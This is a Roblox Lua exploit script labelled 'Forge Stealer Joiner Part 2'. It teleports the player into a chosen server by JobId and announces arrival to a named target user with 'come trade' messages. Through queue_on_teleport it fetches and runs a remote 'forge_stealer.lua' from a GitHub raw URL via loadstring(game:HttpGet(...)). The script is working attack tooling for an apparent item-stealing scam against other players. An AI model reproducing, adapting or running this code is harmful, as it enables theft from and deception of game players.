-- FORGE STEALER JOINER - Part 2 (Final Join)
-- GitHub Raw: https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/joiner_part2.lua

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local lp = Players.LocalPlayer

-- Get config (preserved from part 1)
local JOBID = getgenv().JOBID or ""
local TARGET_SEA = tonumber(getgenv().SEA) or 2
local TARGET_USER = getgenv().USER or ""

local SEA_PLACE_IDS = {
    [1] = 2753915549,
    [2] = 4442272183,
    [3] = 7449423635,
}

-- Notifier
local function getOrCreateNotifier()
    local screenGui = CoreGui:FindFirstChild("ForgeJoiner")
    if not screenGui then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ForgeJoiner"
        screenGui.ResetOnSpawn = false
        screenGui.Parent = CoreGui
        
        local holder = Instance.new("Frame")
        holder.Name = "Holder"
        holder.AnchorPoint = Vector2.new(1, 1)
        holder.Position = UDim2.new(1, -20, 1, -20)
        holder.Size = UDim2.new(0, 340, 0, 0)
        holder.BackgroundTransparency = 1
        holder.Parent = screenGui
        
        local layout = Instance.new("UIListLayout")
        layout.FillDirection = Enum.FillDirection.Vertical
        layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
        layout.Padding = UDim.new(0, 8)
        layout.Parent = holder
    end
    return CoreGui.ForgeJoiner.Holder
end

local function notify(title, text, duration, isError)
    duration = duration or 4
    local holder = getOrCreateNotifier()
    
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = isError and Color3.fromRGB(40, 20, 25) or Color3.fromRGB(16, 18, 28)
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.Size = UDim2.new(0, 320, 0, 0)
    frame.AutomaticSize = Enum.AutomaticSize.Y
    frame.Parent = holder
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = isError and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(80, 180, 255)
    stroke.Thickness = 1.5
    stroke.Parent = frame
    
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 10)
    padding.PaddingBottom = UDim.new(0, 10)
    padding.PaddingLeft = UDim.new(0, 12)
    padding.PaddingRight = UDim.new(0, 12)
    padding.Parent = frame
    
    local titleLbl = Instance.new("TextLabel")
    titleLbl.BackgroundTransparency = 1
    titleLbl.Font = Enum.Font.GothamSemibold
    titleLbl.TextSize = 14
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.TextColor3 = isError and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(210, 230, 255)
    titleLbl.Text = title
    titleLbl.Size = UDim2.new(1, 0, 0, 18)
    titleLbl.Parent = frame
    
    local msgLbl = Instance.new("TextLabel")
    msgLbl.BackgroundTransparency = 1
    msgLbl.Font = Enum.Font.Gotham
    msgLbl.TextSize = 12
    msgLbl.TextXAlignment = Enum.TextXAlignment.Left
    msgLbl.TextYAlignment = Enum.TextYAlignment.Top
    msgLbl.TextWrapped = true
    msgLbl.TextColor3 = Color3.fromRGB(190, 200, 220)
    msgLbl.Text = text
    msgLbl.Size = UDim2.new(1, 0, 0, 0)
    msgLbl.AutomaticSize = Enum.AutomaticSize.Y
    msgLbl.Parent = frame
    
    frame.Size = UDim2.new(0, 320, 0, titleLbl.TextBounds.Y + msgLbl.TextBounds.Y + 30)
    
    task.delay(duration, function()
        if frame and frame.Parent then
            local tween = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                BackgroundTransparency = 1,
                Size = UDim2.new(0, 320, 0, 0)
            })
            tween:Play()
            tween.Completed:Wait()
            frame:Destroy()
        end
    end)
end

local function joinTargetServer()
    if JOBID == "" then
        notify("❌ Forge Joiner", "No JOBID specified!", 3, true)
        return false
    end
    
    local targetPlaceId = SEA_PLACE_IDS[TARGET_SEA] or game.PlaceId
    
    notify("🔗 Forge Joiner", "Joining target server...\nJobId: " .. string.sub(JOBID, 1, 16) .. "...", 3)
    
    if queue_on_teleport then
        local stealer_url = getgenv().STEALER_URL or "https://raw.githubusercontent.com/theniceguyim/forge-joiner/main/forge_stealer.lua"
        queue_on_teleport('loadstring(game:HttpGet("' .. stealer_url .. '"))()')
    end
    
    local success, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(targetPlaceId, JOBID, lp)
    end)
    
    if not success then
        notify("⚠️ Forge Joiner", "Failed to join: " .. tostring(err), 4, true)
        return false
    end
    
    return true
end

local function sendChatMessage(msg)
    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
    local commF = remotes and remotes:FindFirstChild("CommF_")
    if commF then
        pcall(function() commF:InvokeServer("Chat", msg) end)
    end
end

local function waitAndAnnounce()
    if not lp.Character or not lp.Character.Parent then
        lp.CharacterAdded:Wait()
    end
    task.wait(2)
    
    if TARGET_USER and TARGET_USER ~= "" then
        sendChatMessage("/w " .. TARGET_USER .. " im here bro")
        task.wait(1)
        sendChatMessage("im here bro, come trade")
        notify("✅ Forge Joiner", "Announced arrival to " .. TARGET_USER, 3)
    end
end

-- MAIN
notify("⚔️ Forge Stealer", "Part 2 loaded - Joining server...", 2)

if tostring(game.JobId) == JOBID then
    notify("✅ Forge Joiner", "Already in target server!\nWaiting for trade...", 3)
    waitAndAnnounce()
else
    joinTargetServer()
    task.wait(5)
    if tostring(game.JobId) == JOBID then
        waitAndAnnounce()
    end
end
